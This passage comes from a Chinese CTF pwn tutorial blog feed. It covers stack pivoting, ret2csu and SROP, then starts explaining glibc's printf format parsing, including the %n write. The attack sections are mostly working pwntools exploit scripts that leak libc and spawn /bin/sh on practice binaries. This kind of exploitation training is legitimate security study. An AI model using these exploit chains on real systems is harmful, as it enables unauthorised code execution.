rbp;ret</code></p><p>程序中不存在后门函数，那么想要获取<code>shell</code>, 就需要获取libc地址，通过栈迁移构造<code>system(&quot;/bin/sh&quot;);</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;exp思路</span><br><span class="hljs-string">    将栈迁移到 got表 附近通过 write 获取程序引用的 libc在内存中的基地址 </span><br><span class="hljs-string">    然后将栈迁移到 bss段 中较高的地址处，执行 system函数 </span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=process(<span class="hljs-string">&#x27;pwn_tran&#x27;</span>)<br>e=ELF(<span class="hljs-string">&#x27;&#x27;</span>,checksec=<span class="hljs-literal">False</span>)<br>libc=ELF(<span class="hljs-string">&#x27;libc-2.33.so&#x27;</span>,checksec=<span class="hljs-literal">False</span>)<br>leave=<span class="hljs-number">0x4011bd</span><br>ret=<span class="hljs-number">0x4011be</span><br>read=<span class="hljs-number">0x401182</span><br>write=<span class="hljs-number">0x40119d</span><br>bss=<span class="hljs-number">0x404048</span><br>read_got=<span class="hljs-number">0x404020</span><br>rdi=<span class="hljs-number">0x0000000000401223</span><br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(bss)+p64(read))<br>p.read()<br>payload=<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+p64(bss+<span class="hljs-number">0x800</span>)+p64(read)+p64(bss-<span class="hljs-number">0x18</span>)+p64(bss-<span class="hljs-number">0x18</span>)+p64(write)<br>p.send(payload)<br>p.read(<span class="hljs-number">0x40</span>)<br>read_addr=u64(p.read(<span class="hljs-number">8</span>))<br>libc.address=read_addr-libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address))<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh=<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>))<br>bss=bss+<span class="hljs-number">0x700</span><br>payload=p64(bss+<span class="hljs-number">0x200</span>)+p64(rdi)+p64(bin_sh)+p64(system)+p64(bss+<span class="hljs-number">0x100</span>-<span class="hljs-number">0x20</span>)+p64(leave)<br><span class="hljs-comment"># 在调用system时不能使用上面在bss段中设置的/bin/sh作为参数 ,因为他在调用write函数时被修改了</span><br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="无法覆盖ret">无法覆盖ret</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*样例代码*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">char</span> b[<span class="hljs-number">0x20</span>]=&#123;&#125;;<br><span class="hljs-type">void</span> <span class="hljs-title function_">func</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span> a[<span class="hljs-number">0x20</span>]=&#123;&#125;;<br>    read(<span class="hljs-number">0</span>,a,<span class="hljs-number">0x28</span>);<br>    read(<span class="hljs-number">0</span>,b,<span class="hljs-number">0x60</span>);<br>    write(<span class="hljs-number">1</span>,b,<span class="hljs-number">0x60</span>);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span> a=<span class="hljs-number">0</span>;<br>    func();<br>&#125;<br><span class="hljs-comment">/*编译命令</span><br><span class="hljs-comment">    gcc pwn_tran.c -fno-stack-protector -no-pie -o pwn_tran</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-%E8%BF%81%E7%A7%BB1.jpg" srcset="/img/loading.gif" lazyload alt="main 函数代码" title="main 函数代码"></p><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-%E8%BF%81%E7%A7%BB1-1.jpg" srcset="/img/loading.gif" lazyload alt="main 函数栈布局" title="main 函数栈布局"></p><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-%E8%BF%81%E7%A7%BB1-2.jpg" srcset="/img/loading.gif" lazyload alt="main 函数汇编代码" title="main 函数汇编代码"></p><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-%E8%BF%81%E7%A7%BB1-3.jpg" srcset="/img/loading.gif" lazyload alt="func 函数代码" title="func 函数代码"></p><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-%E8%BF%81%E7%A7%BB1-4.jpg" srcset="/img/loading.gif" lazyload alt="func 函数栈布局" title="func 函数栈布局"></p><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-%E8%BF%81%E7%A7%BB1-5.jpg" srcset="/img/loading.gif" lazyload alt="func 函数汇编代码" title="func 函数汇编代码"></p><p>就我现在的认知来说，当栈溢出只能修改<code>rbp</code>时，至少需要在返回时连续执行两次<code>leave</code>，才可能控制<br>&gt;  如果在函数返回后，不存在对向栈中写入数据的操作，则需要用户在迁移前向一块地址已知的区域写入数据，否则就无法控制程序流<br>&gt;  如果在函数返回后，存在向栈中写入数据的操作(写入数据地址通过<code>rbp</code>计算)，那么依旧可以控制程序流</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;exp思路</span><br><span class="hljs-string">    因为程序允许向 bss 段中写入数据，而且在 main 函数中也存在 leave;ret 指令，</span><br><span class="hljs-string">    所以我们在 func 函数中将 rbp 设置为全局变量 b ，</span><br><span class="hljs-string">    然后通过 main 函数中的 leave;ret 指令，将栈迁移到 bss 段中</span><br><span class="hljs-string">    在bss段中构造指令泄露 read 函数真实地址，</span><br><span class="hljs-string">    从而获取 libc 的基地址，进而获取 system 函数地址</span><br><span class="hljs-string">    因为全局变量 b 太靠近不可写的段了，</span><br><span class="hljs-string">    所以需要将栈迁移到较高地址处，然后执行 system(&quot;/bin/sh&quot;) </span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>b_add=<span class="hljs-number">0x404060</span><br>read_got=<span class="hljs-number">0x404020</span><br>read=<span class="hljs-number">0x401182</span><br>write_plt=<span class="hljs-number">0x401050</span><br>read_plt=<span class="hljs-number">0x401060</span><br>rdi=<span class="hljs-number">0x401263</span><br>rsi_15=<span class="hljs-number">0x401261</span><br>leave=<span class="hljs-number">0x4011d4</span><br><br>e=ELF(<span class="hljs-string">&#x27;./pwn_tran&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>libc=ELF(<span class="hljs-string">&#x27;libc-2.33.so&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>p=process(<span class="hljs-string">&#x27;pwn_tran&#x27;</span>)<br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(b_add))<br>p.sendline(p64(b_add)+p64(rdi)+p64(<span class="hljs-number">1</span>)+p64(rsi_15)+p64(read_got)+p64(<span class="hljs-number">0</span>)+p64(write_plt)+p64(read))<br>p.read(<span class="hljs-number">0x60</span>)<br>d=u64(p.read(<span class="hljs-number">8</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>libc.address=d-libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh=<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>))<br>p.sendline(<span class="hljs-string">&#x27;&#x27;</span>)<br><br>payload=p64(b_add+<span class="hljs-number">0x808</span>)+p64(rdi)+p64(<span class="hljs-number">0</span>)+p64(rsi_15)+p64(b_add+<span class="hljs-number">0x808</span>)+p64(<span class="hljs-number">0</span>)+p64(read_plt)+p64(leave)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(payload)))<br>p.send(payload)<br>pause()<br>p.send(p64(b_add+<span class="hljs-number">0x900</span>)+p64(rdi)+p64(bin_sh)+p64(system))<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="ret2csu">ret2csu</h2><p>当在执行某些函数或系统调用时需要设置 <code>rdi,rsi,rdx</code> 寄存器时，可以使用<code>ret2csu</code>方法设置寄存器</p><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-csu.jpg" srcset="/img/loading.gif" lazyload alt=""></p><p>利用下半段指令控制寄存器，利用上半段指令设置<code>rdi,rsi,rdx</code>寄存器，并执行指定地址储存的函数地址(也可以是指令地址)，函数或指令的地址通过 <code>r15+rbx*8</code> 获取,所以需要先在已知地址处写入函数或指令的地址(也可以是got表中的成员)</p><p>在控制寄存器时一般设置 <code>rbx=0,rbp=1</code> 这样可以跳出上半段的循环，设置<code>r15</code>为函数地址的二级指针，设置<code>r12</code>为<code>rdi</code>的值(仅支持4字节)，<code>r13</code>为<code>rsi</code>的值，<code>r14</code>为<code>rdx</code>的值，就将64位程序的前三个参数设置好了</p><blockquote><p>在我的理解中，<code>ret2csu</code>就是用来修改 <code>rdx</code>寄存器的值，因为存在<code>__libc_csu_init</code>函数就存在 <code>pop rdi</code> 与 <code>pop rsi;pop r15</code>指令 ，这样就解决了前两个参数，而<code>pop rdx</code>指令一般不存在，所以需要利用<code>ret2csu</code>设置</p></blockquote><p>仅在<code>64位程序</code>中使用，因为<code>64位程序</code>使用寄存器传参，而<code>32位程序</code>的参数储存在栈中，不需要再单独通过<code>ret2csu</code>控制参数</p><p>样例为<code>buuctf</code>中的<code>ciscn_2019_s_3</code>题目</p><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-SROP.jpg" srcset="/img/loading.gif" lazyload alt="main函数代码" title="main函数代码"></p><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-SROP-1.jpg" srcset="/img/loading.gif" lazyload alt="vuln函数代码" title="vuln函数代码"></p><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-SROP-2.jpg" srcset="/img/loading.gif" lazyload alt="vuln函数栈布局" title="vuln函数栈布局"></p><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-SROP-3.jpg" srcset="/img/loading.gif" lazyload alt="vuln函数汇编代码" title="vuln函数汇编代码"></p><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-SROP-4.jpg" srcset="/img/loading.gif" lazyload alt="可利用的指令" title="可利用的指令"></p><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-SROP-5.jpg" srcset="/img/loading.gif" lazyload alt="函数列表" title="函数列表"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;exp思路</span><br><span class="hljs-string">    先通过write(0,buf,0x30) 获取栈地址，</span><br><span class="hljs-string">    然后将/bin/sh写入栈中，</span><br><span class="hljs-string">    利用ret2csu，设置rdx,rsi为0，</span><br><span class="hljs-string">    然后设置rdi为 /bin/sh 的地址</span><br><span class="hljs-string">    最后调用 execve(&quot;/bin/sh&quot;);</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>rdi=<span class="hljs-number">0x00000000004005a3</span><br>pops=<span class="hljs-number">0x40059a</span><br>call=<span class="hljs-number">0x400580</span><br>syscall=<span class="hljs-number">0x400517</span><br>execve=<span class="hljs-number">0x4004e2</span><br>ret=<span class="hljs-number">0x4005a4</span><br>vuln=<span class="hljs-number">0x4004ed</span><br><br>p=process(<span class="hljs-string">&#x27;./srop&#x27;</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(vuln)<br>p.sendline(payload)<br>p.read(<span class="hljs-number">0x20</span>)<br>stack=u64(p.read(<span class="hljs-number">8</span>))-<span class="hljs-number">0x118</span>-<span class="hljs-number">0x10</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(stack))<br>payload=<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>+p64(ret)+p64(pops)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">1</span>)+p64(stack+<span class="hljs-number">8</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(call)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">7</span>+p64(execve)+p64(rdi)+p64(stack)+p64(syscall)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="SROP">SROP</h2><p>利用系统调用sigreturn设置所有寄存器值为栈中的数据</p><p>样例为<code>buuctf</code>中的<code>ciscn_2019_s_3</code>题目</p><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-SROP.jpg" srcset="/img/loading.gif" lazyload alt="main函数代码" title="main函数代码"></p><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-SROP-1.jpg" srcset="/img/loading.gif" lazyload alt="vuln函数代码" title="vuln函数代码"></p><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-SROP-2.jpg" srcset="/img/loading.gif" lazyload alt="vuln函数栈布局" title="vuln函数栈布局"></p><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-SROP-3.jpg" srcset="/img/loading.gif" lazyload alt="vuln函数汇编代码" title="vuln函数汇编代码"></p><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-SROP-4.jpg" srcset="/img/loading.gif" lazyload alt="可利用的指令" title="可利用的指令"></p><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-SROP-5.jpg" srcset="/img/loading.gif" lazyload alt="函数列表" title="函数列表"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;exp思路</span><br><span class="hljs-string">    利用SROP 设置寄存器的值，构造read(0,bss,0x300)，并将栈迁移到bss+8上</span><br><span class="hljs-string">    然后再次利用SROP 设置寄存器的值，构造execve(&quot;/bin/sh&quot;) 获取shell</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>p=process(<span class="hljs-string">&#x27;./srop&#x27;</span>)<br>bss=<span class="hljs-number">0x601030</span><br>sig=<span class="hljs-number">0x4004da</span><br>syscall=<span class="hljs-number">0x400517</span><br><br>execve=SigreturnFrame()<br>execve.rdi=bss<br>execve.rsi=<span class="hljs-number">0</span><br>execve.rdx=<span class="hljs-number">0</span><br>execve.rsp=bss+<span class="hljs-number">0x300</span><br>execve.rbp=bss<br>execve.rax=<span class="hljs-number">0x3b</span><br>execve.rip=syscall<br><br>read=SigreturnFrame()<br>read.rdi=<span class="hljs-number">0</span><br>read.rsi=bss<br>read.rdx=<span class="hljs-number">0x300</span><br>read.rsp=bss+<span class="hljs-number">0x8</span><br>read.rbp=bss+<span class="hljs-number">0x100</span><br>read.rax=<span class="hljs-number">0</span><br>read.rip=syscall<br>p.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(sig)+p64(syscall)+<span class="hljs-built_in">str</span>(read))<br><br>p.send(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+p64(sig)+p64(syscall)+<span class="hljs-built_in">str</span>(execve))<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwnbase</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>格式化字符串</title>
    <link href="/page/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    <url>/page/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    
    <content type="html"><![CDATA[<p>利用程序直接对用户可控制的数据格式化，让用户可以利用格式化字符串达到任意地址读写<br>因为格式化字符串的参数在栈中，所以尽管无法写，也可以从栈中获取些有用的信息</p><h2 id="格式化详解">格式化详解</h2><p><code>printf</code>实际执行的是位于<code>stdio-common/vfprintf-internal.c</code>文件中的<code>vfprintf函数</code><br>在<code>vfprintf</code>中会按照占位符的顺序输出字符串，但如果占位符中存在<code>$</code>就会执行<code>printf_positional</code>函数<br>在<code>printf_positional</code>函数中会先将 字符串 中所有占位符都搜索出来，储存在数组中，然后遍历数组根据占位符类型输出字符串</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* 在格式化字符串时会用到6个这样的表，用来防止存在歧义 */</span><br><span class="hljs-comment">/* Step 0: at the beginning.  */</span><br><span class="hljs-type">static</span> JUMP_TABLE_TYPE step0_jumps[<span class="hljs-number">30</span>] =<br>&#123; <span class="hljs-comment">// 在下面，如果不存在对应类型的参数，则将剩下的参数中的第一个，强制转换为对应参数</span><br>   <span class="hljs-comment">// 说是参数，实际上是栈中的值 在64位中，前六个参数使用寄存器</span><br>  REF (form_unknown),<br>  REF (flag_space),      <span class="hljs-comment">/* for &#x27; &#x27;          使用空格作为填充 默认也是空格*/</span><br>  REF (flag_plus),       <span class="hljs-comment">/* for &#x27;+&#x27;          在正数前面添加 &#x27;+&#x27; */</span><br>  REF (flag_minus),      <span class="hljs-comment">/* for &#x27;-&#x27;          右对齐*/</span><br>  REF (flag_hash),       <span class="hljs-comment">/* for &#x27;&lt;hash&gt;&#x27; #     使用#号触发 与x 组合表示使用 0x??的格式 与 X组合表示使用 0X??的格式</span><br><span class="hljs-comment">                                                             与g/G 组合表示用0填充小数位*/</span><br>  REF (flag_zero),       <span class="hljs-comment">/* for &#x27;0&#x27;          使用0作为填充仅在左对齐时有效*/</span><br>  REF (flag_quote),      <span class="hljs-comment">/* for &#x27;\&#x27;&#x27;         暂时不知道用处*/</span><br>  REF (width_asterics),  <span class="hljs-comment">/* for &#x27;*&#x27;          从printf后面的参数中获取整数类型参数作为输出宽度 宽度不能大于2147483647*/</span><br>  REF (width),           <span class="hljs-comment">/* for &#x27;1&#x27;...&#x27;9&#x27;    这一条没有明确代码，但与 width_asterics 在一起执行，将字符串转换为整数 宽度不能大于2147483647</span><br><span class="hljs-comment">                     当数字后面是 $ 字符时，将数字作为偏移 */</span><br>  REF (precision),       <span class="hljs-comment">/* for &#x27;.&#x27;          在搜索到 . 之后，如果后面的字符为 * 则将printf 中未使用过的参数中的整数作为小数长度位</span><br><span class="hljs-comment">                                                                    如果后面的字符为数字，就将数字作为小数位长度*/</span><br>  REF (mod_half),        <span class="hljs-comment">/* for &#x27;h&#x27;          将数据当作 二字节数据处理 ，但如果两个h连在一起 则将数据作为 一字节数据处理*/</span><br>  REF (mod_long),        <span class="hljs-comment">/* for &#x27;l&#x27;          将数据作为 四字节数据处理*/</span><br>  REF (mod_longlong),    <span class="hljs-comment">/* for &#x27;L&#x27;, &#x27;q&#x27;     将数据作为 八字节数据处理*/</span><br>  REF (<span class="hljs-type">mod_size_t</span>),      <span class="hljs-comment">/* for &#x27;z&#x27;, &#x27;Z&#x27;     通过 size_t 判断 将数据作为 四字节 还是 八字节处理*/</span><br>  REF (form_percent),    <span class="hljs-comment">/* for &#x27;%&#x27;          输出 %*/</span><br>  REF (form_integer),    <span class="hljs-comment">/* for &#x27;d&#x27;, &#x27;i&#x27;     将数据以十进制有符号整型的方式输出*/</span><br>  REF (form_unsigned),   <span class="hljs-comment">/* for &#x27;u&#x27;          将数据以十进制无符号整型的方式输出*/</span><br>  REF (form_octal),      <span class="hljs-comment">/* for &#x27;o&#x27;          将数据以八进制无符号整型的方式输出*/</span><br>  REF (form_hexa),       <span class="hljs-comment">/* for &#x27;X&#x27;, &#x27;x&#x27;     将数据以十六进制无符号整型的方式输出</span><br><span class="hljs-comment">                                                    使用X表示以大写十六进制输出</span><br><span class="hljs-comment">                                                    使用x表示以小写十六进制输出*/</span><br>  REF (form_float),      <span class="hljs-comment">/* for &#x27;E&#x27;, &#x27;e&#x27;, &#x27;F&#x27;, &#x27;f&#x27;, &#x27;G&#x27;, &#x27;g&#x27;   e/E 表示以指数的形式输出小数，区别为输出时e的大小写</span><br><span class="hljs-comment">                                                           f/F 表示以普通小数的形式输出小数，区别在于 当小数为无限小数或小数位过长时，输出的 inf,infinity,nan的大小写</span><br><span class="hljs-comment">                                                           g/G 按数值大小自动区分使用e或f 区别也是大小写*/</span><br>  REF (form_character),  <span class="hljs-comment">/* for &#x27;c&#x27;          将参数中剩下的第一个整数作为字符输出*/</span><br>  REF (form_string),     <span class="hljs-comment">/* for &#x27;s&#x27;, &#x27;S&#x27;     将printf参数中第一个参数，作为字符指针，输出指向的字符串*/</span><br>  REF (form_pointer),    <span class="hljs-comment">/* for &#x27;p&#x27;          将printf参数中第一个指针 使用 %#x 的形式输出 当指针不存在时 使用整数*/</span><br>  REF (form_number),     <span class="hljs-comment">/* for &#x27;n&#x27;          将当前输出的长度，写入到printf参数中剩下的第一个参数指向的位置*/</span><br>  REF (form_strerror),   <span class="hljs-comment">/* for &#x27;m&#x27;          按照当前错误信息输出错误，当没有错误时输出 Success*/</span><br>  REF (form_wcharacter), <span class="hljs-comment">/* for &#x27;C&#x27;          将printf参数中剩下的第一个 wchar_t 类型的参数，输出*/</span><br>  REF (form_floathex),   <span class="hljs-comment">/* for &#x27;A&#x27;, &#x27;a&#x27;     按照十六进制的形式输出小数*/</span><br>  REF (<span class="hljs-type">mod_ptrdiff_t</span>),   <span class="hljs-comment">/* for &#x27;t&#x27;          通过 ptrdiff_t 判断 将数据作为 四字节 还是 八字节处理*/</span><br>  REF (<span class="hljs-type">mod_intmax_t</span>),    <span class="hljs-comment">/* for &#x27;j&#x27;          通过 intmax_t 判断 将数据作为 四字节 还是 八字节处理*/</span><br>  REF (flag_i18n),       <span class="hljs-comment">/* for &#x27;I&#x27;          暂时不知道用处*/</span><br>&#125;;<br></code></pre></td></tr></table></figure><table><thead><tr><th style="text-align:center">数据宽度</th><th>作用</th></tr></thead><tbody><tr><td style="text-align:center">h</td><td>将数据作为<code>short</code>类型处理</td></tr><tr><td style="text-align:center">hh</td><td>将数据作为<code>char</code>类型处理</td></tr><tr><td style="text-align:center">l</td><td>将数据作为<code>long</code>类型处理</td></tr><tr><td style="text-align:center">q/L</td><td>将数据作为<code>long long</code>类型处理</td></tr><tr><td style="text-align:center">z/Z</td><td>通过<code>size_t</code>判断，将数据作为<code>long</code>类型处理还是以<code>long long</code>类型处理</td></tr></tbody></table><table><thead><tr><th style="text-align:center">标志</th><th>作用</th></tr></thead><tbody><tr><td style="text-align:center">space</td><td>使用空格作为填充符号</td></tr><tr><td style="text-align:center">+</td><td>在正数的前面添加<code>+</code> 输入时输入+ 可以省略一个值的输入</td></tr><tr><td style="text-align:center">-</td><td>右对齐(默认左对齐) 输入时输入- 可以省略一个值的输入</td></tr><tr><td 